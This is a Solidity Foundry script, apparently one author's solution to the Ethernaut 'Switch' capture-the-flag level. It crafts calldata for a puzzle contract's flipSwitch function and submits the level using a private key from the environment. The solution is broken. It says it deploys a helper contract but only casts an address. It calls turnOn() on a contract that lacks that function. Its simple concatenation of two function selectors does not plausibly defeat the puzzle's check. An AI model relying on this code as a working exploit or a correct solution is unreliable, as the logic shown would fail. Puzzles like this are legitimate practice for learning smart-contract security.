// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here
import {Switch} from "../../challenge-contracts/29-Switch.sol";

contract SwitchSolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0xb2aBa0e156C905a9FAEc24805a009d99193E3E53;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        address challengeInstance = createInstance(LEVEL_ADDRESS);

        ////////////////////////////////////////////////////////////////////////////////////
        // Start of Ric Li C's Solution
        ////////////////////////////////////////////////////////////////////////////////////
        // Step 1: Deploy Person contract;
        Person person = Person(challengeInstance);

        // Step 2: Call `turnOn()` function of the Person contract,
        person.turnOn();

        // Step 3: Confirm that `switchOn` of the Switch contract is true.
        Switch target = Switch(challengeInstance);
        require(target.switchOn() == true, "Switch check failed");

        ////////////////////////////////////////////////////////////////////////////////////
        // End of Ric Li C's Solution
        ////////////////////////////////////////////////////////////////////////////////////

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(29));
    }
}

////////////////////////////////////////////////////////////////////////////////////
// Start of Ric Li C's Solution (Extra Contract)
// Additional contract codes to help solve this puzzle
////////////////////////////////////////////////////////////////////////////////////
contract Person {
    Switch target;

    constructor(address targetAddress) {
        target = Switch(targetAddress);
    }

    function turnOn() external {
        bytes memory offData = abi.encodeWithSignature("turnSwitchOff()");
        bytes memory onData = abi.encodeWithSignature("turnSwitchOn()");
        bytes memory combinedData = abi.encodePacked(offData, onData);
        target.flipSwitch(combinedData);
    }
}
////////////////////////////////////////////////////////////////////////////////////
// End of Ric Li C's Solution (Extra Contract)
////////////////////////////////////////////////////////////////////////////////////
